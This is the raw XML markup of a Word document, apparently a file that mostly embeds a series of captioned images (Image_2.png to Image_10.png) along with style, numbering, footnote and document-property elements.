      <w:pPr>
        <w:pStyle w:val="ListBullet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74F419BE" w14:textId="77777777" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:pStyle w:val="ListBullet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3FF290E3" w14:textId="77777777" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:pStyle w:val="ListBullet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27947201" w14:textId="77777777" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="141B1A5F" w14:textId="256A9306" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="04970EE5" wp14:editId="0C9BE6ED">
            <wp:extent cx="5857875" cy="497614"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1886570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70579" name="Picture 18865705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617" cy="4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C88" w14:textId="40B009DE" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Image_2.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C727599" w14:textId="77777777" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17A5EBC1" w14:textId="77777777" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1349CB60" w14:textId="736390FB" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4DBDD33C" wp14:editId="6674B38C">
            <wp:extent cx="5486400" cy="217805"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="879076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76313" name="Picture 8790763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E60D" w14:textId="77777777" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9"/>
    <w:p w14:paraId="2AE6C1E4" w14:textId="1B7BFD40" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Image_3.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B3C001" w14:textId="77777777" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="447381CF" w14:textId="30FCDAE2" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6F65D016" wp14:editId="3C4C5DF2">
            <wp:extent cx="6062558" cy="447675"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1425981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81115" name="Picture 14259811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2245" cy="44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DEA" w14:textId="7FC68713" w:rsidR="004C67AF" w:rsidRDefault="000705E9" w:rsidP="004C67AF">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Image_4.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="341BA353" w14:textId="213CE4B8" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="381F2E8D" wp14:editId="1632EF46">
            <wp:extent cx="5486400" cy="2943860"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="14823709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70929" name="Picture 14823709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534F" w14:textId="77777777" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="376F6925" w14:textId="186E7204" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Image_5.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5345B6D5" w14:textId="77777777" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="448817CE" w14:textId="248A3D28" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E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764FEF" wp14:editId="05EAE064">
            <wp:extent cx="5486400" cy="2858135"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1137736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36980" name="Picture 11377369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F2E2" w14:textId="77777777" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="032BBE54" w14:textId="6C5FA6AF" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>Image_6.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E6E1DE" w14:textId="77777777" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A4DC0DE" w14:textId="77777777" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30E9958A" w14:textId="75FC4830" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6A6A41BC" wp14:editId="6F4C1AE0">
            <wp:extent cx="5486400" cy="2943860"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="85423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35388" name="Picture 8542353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9810" w14:textId="65247D92" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Image_7.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4064C637" w14:textId="77777777" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4087B23D" w14:textId="20A96EBB" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F09B542" wp14:editId="5B716133">
            <wp:extent cx="5486400" cy="2943860"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="9260806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80615" name="Picture 9260806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1C8C" w14:textId="7E05E5B7" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Image_8.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EBE6946" w14:textId="77777777" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="750BB10F" w14:textId="4718F4B1" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="237007F7" wp14:editId="68FD13E8">
            <wp:extent cx="5486400" cy="2943860"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="12069226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22629" name="Picture 12069226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F7A5" w14:textId="77777777" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="620186C1" w14:textId="7F62ECAC" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Image_9.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58C7FFDC" w14:textId="77777777" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64B4D34B" w14:textId="0A8443E9" w:rsidR="004C67AF" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0F2DF63F" wp14:editId="0145848C">
            <wp:extent cx="5486400" cy="2943860"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="5617786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78614" name="Picture 5617786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581A" w14:textId="622B9DDE" w:rsidR="004C67AF" w:rsidRPr="000705E9" w:rsidRDefault="004C67AF" w:rsidP="000705E9">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Image_10.png</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="004C67AF" w:rsidRPr="000705E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AF959B" w14:textId="77777777" w:rsidR="00B2392C" w:rsidRDefault="00B2392C" w:rsidP="000705E9">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="50B807D7" w14:textId="77777777" w:rsidR="00B2392C" w:rsidRDefault="00B2392C" w:rsidP="00070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708220" w14:textId="77777777" w:rsidR="00B2392C" w:rsidRDefault="00B2392C" w:rsidP="000705E9">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="10BBCCF8" w14:textId="77777777" w:rsidR="00B2392C" w:rsidRDefault="00B2392C" w:rsidP="000705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91192935">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1597249408">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="689337860">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="2136287198">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1798260658">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1161576289">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1677804483">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1933123156">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="193542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7F81"/>
    <w:rsid w:val="00034616"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="000705E9"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="004C67AF"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B2392C"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D32D1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D65B5E"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{9D66755F-C7D5-4DBE-B678-487AB93A9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Kwame Awuku</cp:lastModifiedBy>
  <cp:revision>3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-05-19T19:02:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>